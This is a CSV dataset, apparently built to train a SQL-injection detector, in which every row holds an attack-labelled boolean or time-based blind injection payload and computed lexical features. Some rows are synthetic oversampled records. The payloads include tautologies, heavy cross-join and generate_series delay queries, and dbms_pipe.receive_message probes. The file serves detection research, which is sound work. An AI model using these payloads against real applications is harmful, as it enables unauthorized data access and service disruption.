id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000403,attack,boolean,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000310,0.22744283173711408,121.23219797089372,29.352056563112495,4.061146003149015,65.23219797089372,8.176028281556246,34.64794343688751,13.176028281556246,0.5378610949061712,0.0674058930459055,0.2860647167614974,0.10866829528642594,1.0,0.0,0.0,0.0,1.0,1.0,0.0,4.823971718443754,0.0,0.0,2.1760282815562464,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000404,attack,boolean,"1%'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000479,0.44536019598132454,130.79251838839699,30.0,3.4094765159658995,36.05669118452933,13.0,61.0,20.735827203867668,0.2754316578277668,0.09941726589088457,0.4664964014879968,0.15865467479335182,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,1.735827203867669,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000405,attack,boolean,"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",nearest_attack_euclidean,R000999,0.3371485191891906,90.65076223833876,28.920609790670998,3.6688662232327807,22.920609790670998,16.0,38.0,13.730152447667749,0.2525084716418793,0.17661017043810345,0.4194491547904957,0.15143220312952155,0.0,4.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,0.7301524476677496,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000406,attack,boolean,"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",nearest_attack_euclidean,R000115,0.6643856323977427,67.71236743063406,20.169893944507248,3.336146375621134,11.169893944507251,21.0,28.0,7.542473486126811,0.1640949009928054,0.31055830416630437,0.4140777388884058,0.11126905595248447,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.5424734861268119,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000407,attack,boolean,"-8686"" where 4532  =  4532 or elt  (  3301  =  9065,9065  )  --",nearest_attack_euclidean,R000747,0.0,63.0,23.0,3.807387472639001,10.0,24.0,20.0,9.0,0.15873015873015872,0.38095238095238093,0.31746031746031744,0.14285714285714285,0.0,1.0,3.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000408,attack,boolean,"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000765,0.14171926958322575,120.90028348060248,30.0,4.090195376907434,64.0,8.0,34.120226784481986,14.780056696120496,0.5295209371753847,0.06619011714692309,0.2820623333253268,0.12222661235236537,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.780056696120496,0.0,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000409,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000300,0.035245791441693916,124.70717745006384,27.0,3.6304052037367303,37.0,16.0,49.765741960051066,21.941435490012765,0.29672229562317587,0.12831234405326525,0.39902392483354615,0.17594143549001276,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.941435490012767,0.0,2.0,1.0,7.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000410,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",nearest_attack_euclidean,R000150,0.07837795869444866,73.6319812684269,23.852792507370765,3.654450632523015,20.705585014741526,13.0,28.0,11.926396253685382,0.28103049049234385,0.1766126603036526,0.38039649911555945,0.16196035008844406,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.9263962536853818,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,boolean," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000006,0.0698512553864511,69.0,21.897989080813243,3.382475499448316,26.0,5.102010919186757,28.0,9.897989080813243,0.37681159420289856,0.07394218723459067,0.4057971014492754,0.14344911711323544,0.0,2.0,2.0,0.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,6.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000412,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R001298,0.02795159179298189,155.01235013221213,32.012350132212134,3.840411565452987,48.0,24.0,58.0,25.01235013221213,0.30965290296335063,0.15482645148167531,0.37416392441404867,0.16135672114092542,0.0,0.012350132212131215,2.0,0.0,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.0,0.0,0.012350132212131382,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000413,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000173,0.1815849395446955,130.64603483926498,30.54158606429401,3.580718578015624,46.0,10.0,55.91682787141198,18.729206967852996,0.3522000952871517,0.07656523810590254,0.42789294280531365,0.14334172380163213,5.0,0.0,0.0,1.0,0.0,1.0,0.0,10.729206967852996,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000414,attack,boolean,"1'+  (  select 'lawc' where 1171  =  1171 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001417,0.04988566282282607,131.0195071037284,32.07802841491354,3.8851137454692335,46.01950710372839,21.0,46.0,18.0,0.3512409266607051,0.16028165341323755,0.35109314557185367,0.13738427435420364,3.0,0.0,2.0,0.0,1.0,2.0,0.0,7.0,0.0,1.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,2.0,0.0,1.0,1.0,0.0195071037283856,0.9804928962716144,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000415,attack,boolean,1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,nearest_attack_euclidean,R000494,0.05233820318905437,69.0,24.0,3.6401200972662355,14.0,21.0,26.0,8.0,0.2028985507246377,0.30434782608695654,0.37681159420289856,0.11594202898550725,0.0,0.0,2.0,0.0,1.0,2.0,0.0,3.0000000000000004,0.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R001179,0.017671064338455444,127.86735884985464,31.973471769970928,4.36288139891614,80.0,4.0,28.89388707988371,14.973471769970928,0.6256739895840719,0.03128369947920359,0.225944114556614,0.11709819638011046,0.0,3.0,0.0,0.0,1.0,1.0,0.0,2.9734717699709283,0.0,0.0,3.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001178,0.5075804746980728,143.78871500544358,30.0,3.9779313678025816,75.0,8.0,41.63097200435486,19.157743001088715,0.522221228681538,0.055703597726030715,0.2889194908636682,0.13315568272876313,0.0,4.0,0.0,0.0,1.0,2.0,0.0,5.157743001088715,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000418,attack,boolean,1'||  (  select 'cclo' from dual where 6823  =  6823 and 9198  =  9198--,nearest_attack_euclidean,R000082,0.4690266258675981,72.90412366611304,27.452061833056522,4.1674880138401225,26.0,17.0,19.602749110742028,10.301374555371014,0.3569253533976248,0.23337426952921622,0.268557618646239,0.14114275842691998,3.150687277685507,0.0,1.698625444628986,0.0,0.0,2.0,0.0,1.150687277685507,0.0,0.0,0.0,6.0,1.0,0.0,0.849312722314493,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000419,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000454,0.2605391410514143,109.14250129577526,27.0,3.493768703042756,34.0,13.0,47.71400103662021,14.428500259155053,0.3119382503349821,0.11927050748102257,0.43668368490396203,0.1321075572800333,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.428500259155053,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000420,attack,boolean,"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",nearest_attack_euclidean,R001502,0.8572287918322019,72.19198349015358,23.0,3.2827386915931602,8.0,16.0,33.30741442013163,14.884569070021938,0.11183032804522186,0.22366065609044378,0.4577488284099219,0.2067601874544125,4.0,0.0,1.0,0.0,0.0,2.0,0.0,4.884569070021938,2.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000421,attack,boolean,1'+  (  select xruo where 5709  =  5709 and 7533  =  7533  )  +',nearest_attack_euclidean,R000975,0.5088165680969341,64.66799633292156,26.0,3.8874012880430144,18.0,17.0,21.0,8.667996332921561,0.27840342471766377,0.26293656778890473,0.3248039955039411,0.13385601198949038,2.66799633292156,0.0,0.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000422,attack,boolean,1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,nearest_attack_euclidean,R001095,0.050767023439950806,65.37137987047562,15.962862012952435,2.937455685508131,14.0,9.0,32.2971038963805,10.074275974095125,0.21431808857709564,0.13777591408527579,0.4938313020327205,0.15407469530490808,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.074275974095125,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000423,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   7700  =  7700",nearest_attack_euclidean,R001252,0.12561207467421684,126.16441714440096,28.0,3.940108753036204,71.16441714440096,10.641893061886124,33.23873795874258,11.119368979371291,0.5639135789332055,0.08423305972907659,0.2636413356295982,0.08821202570811965,0.0,0.0,0.0,0.0,1.0,1.0,0.0,4.119368979371291,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000424,attack,boolean,-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R001534,0.31906184094914364,149.7035885291575,36.264542037796964,4.288836344085769,58.5872522267818,26.0,45.11633630237573,20.0,0.39129427563990427,0.17396004701378015,0.3009302565664847,0.13381542077983088,4.735457962203033,0.0,3.0,0.0,0.0,2.0,0.0,5.264542037796966,0.0,0.0,0.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000425,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000841,0.14415447183915775,62.0,21.71146323317453,3.51630319088792,14.0,17.0,24.0,7.0,0.22580645161290322,0.27419354838709675,0.3870967741935484,0.11290322580645161,1.0,0.0,2.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,boolean,"1'||  (  select 'fmss' from dual where 7025  =  7025 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R001122,0.25148834021920635,147.30602461190938,33.07710837645451,3.960069312152466,53.460241364818415,21.0,51.84578324709098,21.0,0.36280334400884784,0.1426003054224141,0.35199604514632393,0.1426003054224141,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,0.0,1.0,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,2.0,0.0,1.0,1.9228916235454876,0.07710837645451252,0.9228916235454876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.922891623545487
SMOTE_000427,attack,boolean,"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",nearest_attack_euclidean,R001136,0.7101688728688431,147.1875834594824,30.61250556396549,4.072787078095623,75.0,8.612505563965493,43.12505563965493,20.450022255861974,0.5108426276659477,0.05849318462401151,0.29204873971163836,0.13861544799840242,4.0,0.0,0.0,0.0,1.0,2.0,0.0,5.225011127930987,2.0,0.0,2.6125055639654935,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000428,attack,boolean,-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000202,0.4365197939838366,66.52477733316357,21.26238866658179,3.5513069408181512,8.893582999872685,24.0,24.631194333290892,9.0,0.13183938165358214,0.3618501180564397,0.37061670601881325,0.1356937942711649,0.0,0.0,3.0,0.0,1.0,2.0,0.0,3.0000000000000004,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000429,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'cqrp'  =  'cqrp",nearest_attack_euclidean,R001344,0.3801110286765354,148.31838711310684,29.88639785218447,3.9954240260865483,72.09118281747577,10.0,44.0,22.227204295631058,0.48591279769780316,0.0674339948781589,0.2967095774638992,0.14994362996013882,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.22720429563105865,5.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000430,attack,boolean,"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",nearest_attack_euclidean,R000328,0.16036737573034188,86.57898849761538,22.463190798092302,3.2294796983796825,16.4631907980923,16.0,40.0,14.115797699523075,0.1899527974283276,0.18486278865808253,0.46215697164520636,0.1630274422683835,0.0,4.0,1.0,0.0,0.0,2.0,0.0,6.0,0.0,0.11579769952307561,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000431,attack,boolean,"-9613""   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  ""pupl""  =  ""pupl",nearest_attack_euclidean,R001420,0.33674052300975144,97.88354815944659,27.0,3.2796655962484444,17.50683852755727,16.0,48.0,16.37670963188932,0.17847769472920308,0.16355850138705183,0.49067550416115546,0.16728829972258963,0.0,4.0,1.0,0.0,0.0,2.0,0.0,8.0,0.0,0.37670963188931844,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'  =  '",nearest_attack_euclidean,R001165,0.21535761031533676,107.09225857195057,27.257688214329214,4.068782151536035,66.80381750030449,3.0000000000000018,24.030752857316852,13.257688214329214,0.6238892749382361,0.028077190341855796,0.22414425978167188,0.12388927493823615,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.257688214329213,1.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000433,attack,boolean,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",nearest_attack_euclidean,R000243,0.0562568070118567,125.02476005823324,30.0,4.08492748986146,66.90095976706706,10.0,31.074280174699705,17.04952011646647,0.5351086379036036,0.0799842793281059,0.24854079111315763,0.13636629165513295,0.024760058233235238,0.0,2.0,0.0,1.0,1.0,0.0,4.024760058233235,0.0,5.0,4.0,4.0,0.024760058233235016,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
